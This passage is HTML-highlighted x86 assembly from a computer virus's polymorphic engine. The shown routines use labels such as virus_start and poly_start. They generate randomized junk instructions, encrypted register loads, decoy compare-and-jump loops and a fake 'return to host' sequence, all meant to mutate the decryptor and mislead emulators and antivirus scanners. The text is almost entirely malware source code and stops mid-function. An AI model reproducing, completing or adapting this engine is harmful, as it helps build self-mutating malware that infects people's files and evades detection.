        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_make_edi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000Ah</span><span class="sc0">        </span><span class="sc1">;edi start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;change esi and edi ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gr_change_no</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">__gr_change_no</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_where_in_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">USED_MEMORY</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">a_repeat</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate push value(32/16)/garbage/pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_pushpop_value</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; value32 OR value16 ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;save dword or word ?</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppv_push16</span><span class="sc0">

        </span><span class="sc1">; short or long value ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppv_push32_short</span><span class="sc0">

        </span><span class="sc1">; long value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">          </span><span class="sc1">;save: PUSH 11223344h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;code:  68  44332211</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish32</span><span class="sc0">
    </span><span class="sc5">__ppv_push32_short</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;save: PUSH 00000009h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6Ah</span><span class="sc0">          </span><span class="sc1">;code:  6A     09</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish32</span><span class="sc0">
    </span><span class="sc5">__ppv_push16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppv_push16_short</span><span class="sc0">

        </span><span class="sc1">; long short-value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6866h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish16</span><span class="sc0">
    </span><span class="sc5">__ppv_push16_short</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6A66h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish16</span><span class="sc0">

        </span><span class="sc1">; time to POP value</span><span class="sc0">
    </span><span class="sc5">__ppv_finish32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">   </span><span class="sc1">;POP reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish</span><span class="sc0">
    </span><span class="sc5">__ppv_finish16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">   </span><span class="sc1">;POP reg16</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5866h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc5">__ppv_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to crypt a random value to reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_crypt_value</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to simulate end of encode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can generate "destination" compare like a</span><span class="sc0">
        </span><span class="sc1">;bafflement. So, this garbage generate this code:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   CALL        __pos_1     ;any garbages</span><span class="sc0">
        </span><span class="sc1">;   &lt;rnd_data&gt;          ;typical CALL rnd_data</span><span class="sc0">
        </span><span class="sc1">;  __i: JMP     __compare_back  ;  NEW JUMP</span><span class="sc0">
        </span><span class="sc1">;   &lt;rnd_data&gt;          ;typical CALL rnd_data</span><span class="sc0">
        </span><span class="sc1">;  __pos_1:</span><span class="sc0">
        </span><span class="sc1">;   &lt;next_code&gt;         ;loop,next_index...</span><span class="sc0">
        </span><span class="sc1">;   DEC     reg32       ;typical CMP instruction</span><span class="sc0">
        </span><span class="sc1">;   &lt;garbages&gt;</span><span class="sc0">
        </span><span class="sc1">;   CMP     reg32,reg32     ;compare registers</span><span class="sc0">
        </span><span class="sc1">;   &lt;garbages - no_flags&gt;       ;no_flags garbages</span><span class="sc0">
        </span><span class="sc1">;   JNZ     __i         ;typical CMP c-jump</span><span class="sc0">
        </span><span class="sc1">;  __compare_back:          ;come back and continue</span><span class="sc0">
        </span><span class="sc1">;   &lt;next_code&gt;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_compare</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; do not recursived - because it's few registers</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_compare</span><span class="sc0">

        </span><span class="sc1">; have we some free place in rnd_fill ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_compare</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; select a free base-reg to DEC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">;DEC identification</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;save DEC empty_reg32</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; build CMP instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">__gc_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;i don't want same regz</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gc_new_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;reg to AH</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; * 8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">          </span><span class="sc1">;CMP identification</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc1">; build JNZ jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ far signature</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">   </span><span class="sc1">;select &lt;compare_index&gt;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; build JMP to rnd_fill</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;EDI of rnd_fill_jmp in ECX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">;JMP far signature</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; destroy all rnd_fill buffers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc1">; restore used_regs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">a_compare</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to simulate return to host ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This is my special function to simulate end of decoding.</span><span class="sc0">
        </span><span class="sc1">;Here is scheme:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   &lt;virus_decrypted_body&gt;  ;this is decrypted part</span><span class="sc0">
        </span><span class="sc1">;  __iluzo_return_1:        ;try to find it in this</span><span class="sc0">
        </span><span class="sc1">;   JMP __back      ;file !</span><span class="sc0">
        </span><span class="sc1">;   &lt;virus_crypted_body&gt;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  __poly_start:        ;start of poly decoder</span><span class="sc0">
        </span><span class="sc1">;   &lt;some poly_code&gt;    ;gen index,code...</span><span class="sc0">
        </span><span class="sc1">;   &lt;test_if_i_can_jump&gt;    ;is &lt;__iluzo_return_1&gt;</span><span class="sc0">
        </span><span class="sc1">;   &lt;gen reg32 with __pos_1&gt;;decrypted ? or not ?</span><span class="sc0">
        </span><span class="sc1">;   JMP reg32</span><span class="sc0">
        </span><span class="sc1">;  __back:</span><span class="sc0">
        </span><span class="sc1">;   &lt;next poly_code&gt;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;By my tests I know for gen_garbage is only one empty base</span><span class="sc0">
        </span><span class="sc1">;reg - it means I cannot read index_reg from copro/mmx regz</span><span class="sc0">
        </span><span class="sc1">;because must be REG_NO_COPRO free.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__g_ir_jump</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;offs E9xxxx in virus-body</span><span class="sc0">
        </span><span class="sc5">__g_ir_compare</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;offs JNZ cjump</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">g_iluzo_return</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; test, if global index reg is generated</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_iluzo_return</span><span class="sc0">

        </span><span class="sc1">; we can't be recursived</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_iluzo_return</span><span class="sc0">

        </span><span class="sc1">; what and where to detect</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_iluzo_return</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_get</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_iluzo_return</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; select __iluzo_return label</span><span class="sc0">
    </span><span class="sc5">__g_ir_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_iluzo_ret</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_iluzo_ret</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_iluzo_ret</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_ir_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; select a free register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_ir_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000020h</span><span class="sc0">       </span><span class="sc1">;JMP far has got five bytes</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc1">; compare index and iluzo_index</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
